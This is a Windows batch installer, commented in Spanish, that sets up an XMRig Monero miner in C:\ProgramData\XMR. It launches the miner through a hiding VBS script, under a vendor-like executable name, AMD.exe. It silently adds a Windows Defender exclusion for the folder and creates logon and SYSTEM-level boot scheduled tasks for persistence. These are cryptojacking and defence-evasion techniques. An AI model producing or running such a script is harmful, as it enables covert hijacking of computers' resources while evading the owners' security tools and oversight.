@echo off
setlocal EnableExtensions
rem === CONFIG ===
set "BASE=C:\ProgramData\XMR"
set "EXE=AMD.exe"
set "VBS=ocultar.vbs"
set "TASK_USER=XMRigBackground"
set "TASK_SYS=XMRigBackground_System"
set "WSCRIPT=%SystemRoot%\System32\wscript.exe"
rem ==============

rem --- Comprueba admin ---
net session >nul 2>&1
if errorlevel 1 (
  echo [ERROR] Debes ejecutar este instalador como Administrador.
  pause
  exit /b 1
)

echo [*] Instalando en %BASE% ...
mkdir "%BASE%" >nul 2>&1

copy /y "%EXE%"       "%BASE%" >nul
copy /y "config.json" "%BASE%" >nul
copy /y "uninstall.bat" "%BASE%" >nul
copy /y "%VBS%"       "%BASE%" >nul

echo [*] (Opcional) Añadiendo exclusion en Defender para %BASE% ...
powershell -NoProfile -Command "try{Add-MpPreference -ExclusionPath '%BASE%'}catch{}" >nul 2>&1

rem ----- TAREA 1: al iniciar sesion del usuario (visible/legitima) -----
echo [*] Creando tarea ONLOGON...
schtasks /create /tn "%TASK_USER%" ^
 /tr "\"%WSCRIPT%\" \"%BASE%\%VBS%\"" ^
 /sc onlogon /rl lowest /f >nul 2>&1

rem ----- TAREA 2: al arrancar el equipo (tras apagado/reinicio), como SYSTEM -----
echo [*] Creando tarea ONSTART (SYSTEM)...
schtasks /create /tn "%TASK_SYS%" ^
 /tr "\"%WSCRIPT%\" \"%BASE%\%VBS%\"" ^
 /sc onstart /ru "SYSTEM" /rl HIGHEST /f >nul 2>&1

rem ----- Prueba inmediata de la tarea de arranque -----
echo [*] Probando la tarea de arranque ahora...
schtasks /run /tn "%TASK_SYS%" >nul 2>&1

echo [OK] Instalacion completada.
echo - Carpeta: %BASE%
echo - Tarea usuario : %TASK_USER%
echo - Tarea sistema : %TASK_SYS%
echo - Para ver estado:  schtasks /query /tn "%TASK_SYS%" /v /fo list
echo - Log del minero:   %BASE%\log.txt  o  %BASE%\miner_xmr_log.txt

endlocal
exit /b 0